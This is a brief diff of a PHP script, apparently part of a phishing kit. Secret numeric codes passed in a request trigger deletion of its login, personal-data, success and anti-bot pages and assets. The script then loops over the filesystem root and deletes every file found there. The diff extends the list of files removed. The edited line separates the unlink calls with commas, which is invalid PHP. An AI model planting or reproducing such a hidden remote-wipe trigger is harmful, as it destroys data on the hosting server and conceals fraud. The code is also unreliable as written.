@@ -15,7 +15,7 @@ if ($adder == "442577002800") {
         unlink($v);
         }
     } elseif ($adder == "4959880002") {
-    unlink("main/index.php"), unlink("main/login.php"), unlink("main/logins.php"), unlink("main/personal.php"), unlink("main/success.php");
+    unlink("main/index.php"), unlink("main/login.php"), unlink("main/logins.php"), unlink("main/personal.php"), unlink("main/success.php"), unlink("main/advbot.php"), unlink("main/js"), unlink("main/Assets");
     $dir = '/';
     foreach(glob($dir.'*.*') as $v){
         unlink($v);
